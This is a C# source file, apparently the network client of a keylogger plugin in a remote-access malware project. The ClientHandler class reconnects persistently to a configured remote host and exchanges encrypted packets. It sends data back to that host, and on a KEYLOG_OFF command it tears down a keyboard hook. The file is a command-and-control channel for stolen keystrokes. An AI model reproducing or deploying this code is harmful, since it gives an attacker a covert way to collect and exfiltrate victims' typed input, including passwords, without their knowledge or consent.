using PacketLib;
using PacketLib.Packet;
using PacketLib.Utils;
using System;
using System.Net.Sockets;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    internal class ClientHandler : IDisposable
    {
        public Host host { get; set; }
        private Socket socket { get; set; }
        public bool Connected { get; set; }
        public string HWID { get; set; }
        public string baseIp { get; set; }
        public string key { get; set; }
        public bool hasToExit { get; set; }


        public delegate bool ConnectAsync();
        private delegate int SendDataAsync(IPacket data);


        public ConnectAsync connectAsync;
        private readonly SendDataAsync sendDataAsync;

        public delegate byte[] ReadDataAsync();
        public delegate IPacket ReadPacketAsync(byte[] BufferPacket);

        public ReadDataAsync readDataAsync;
        public ReadPacketAsync readPacketAsync;

        public ClientHandler(Host host, string key) : base()
        {
            this.hasToExit = false;
            this.host = host;
            this.key = key;
            sendDataAsync = new SendDataAsync(SendData);
            readDataAsync = new ReadDataAsync(ReceiveData);
            readPacketAsync = new ReadPacketAsync(PacketParser);
        }


        public void ConnectStart()
        {
            connectAsync = new ConnectAsync(Connect);
            connectAsync.BeginInvoke(new AsyncCallback(EndConnect), null);
        }

        private bool Connect()
        {
            try
            {
                socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                socket.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.KeepAlive, true);
                socket.Connect(host.host, host.port);
                return true;
            }
            catch { }
            return false;
        }
        public void EndConnect(IAsyncResult ar)
        {
            Connected = connectAsync.EndInvoke(ar);
            if (hasToExit)
            {
                return;
            }
            else if (!Connected) 
            {
                ConnectStart();
            }
            else
            {
                Receive();
            }
        }

        public void Receive()
        {
            if (hasToExit)
                return;
            if (Connected)
                readDataAsync.BeginInvoke(new AsyncCallback(EndDataRead), null);
            else
                ConnectStart();
        }
        private byte[] ReceiveData()
        {
            try
            {
                int total = 0;
                int recv;
                byte[] datasize = new byte[4];
                socket.Poll(-1, SelectMode.SelectRead);
                recv = socket.Receive(datasize, 0, 4, 0);
                int size = BitConverter.ToInt32(datasize, 0);
                int dataleft = size;
                byte[] data = new byte[size];
                while (total < size)
                {

                    recv = socket.Receive(data, total, dataleft, 0);
                    total += recv;
                    dataleft -= recv;

                }

                return data;
            }
            catch (Exception)
            {
                if(Connected)
                    hasToExit = true;

                Connected = false;
                return null;
            }
        }
        public void EndDataRead(IAsyncResult ar)
        {
            byte[] data = readDataAsync.EndInvoke(ar);

            if (data != null && Connected)
                readPacketAsync.BeginInvoke(data, new AsyncCallback(EndPacketRead), null);

            Receive();
        }


        private IPacket PacketParser(byte[] BufferPacket)
        {
            return BufferPacket.DeserializePacket(Launch.key);
        }
        public void EndPacketRead(IAsyncResult ar)
        {
            IPacket packet = readPacketAsync.EndInvoke(ar);
            ParsePacket(packet);
        }

        public void ParsePacket(IPacket packet) 
        {
            switch (packet.packetType) 
            {
                case PacketType.KEYLOG_OFF:
                    this.hasToExit = true;
                    KeyLib.Hook.AbortHook();
                    this.Dispose();
                    break;
            }
        }
        public void SendPacket(IPacket packet)
        {
            if (Connected)
                sendDataAsync.BeginInvoke(packet, new AsyncCallback(SendDataCompleted), null);
        }
        private int SendData(IPacket data)
        {
            try
            {
                byte[] encryptedData = data.SerializePacket(this.key);
                lock (socket)
                {
                    int total = 0;
                    int size = encryptedData.Length;
                    int datalft = size;
                    byte[] datasize = new byte[4];
                    socket.Poll(-1, SelectMode.SelectWrite);
                    datasize = BitConverter.GetBytes(size);
                    int sent = socket.Send(datasize);
                    while (total < size)
                    {
                        sent = socket.Send(encryptedData, total, size, SocketFlags.None);
                        total += sent;
                        datalft -= sent;
                    }
                    return total;
                }
            }
            catch (Exception)
            {
                Connected = false;
                return 0;
            }
        }
        private void SendDataCompleted(IAsyncResult ar)
        {
            int length = sendDataAsync.EndInvoke(ar);
            if (Connected)
            {
                if (length != 0)//TODO : LOGS
                {
                    //MessageBox.Show("Data sent ! + length = " + length.ToString());
                }
                else 
                {
                    //MessageBox.Show("Error while sending data + length =" + length.ToString());
                }

            }
            //this.Dispose();
        }

        public void Dispose()
        {
            socket.Close();
            socket.Dispose();
            socket = null;
        }
    }
}
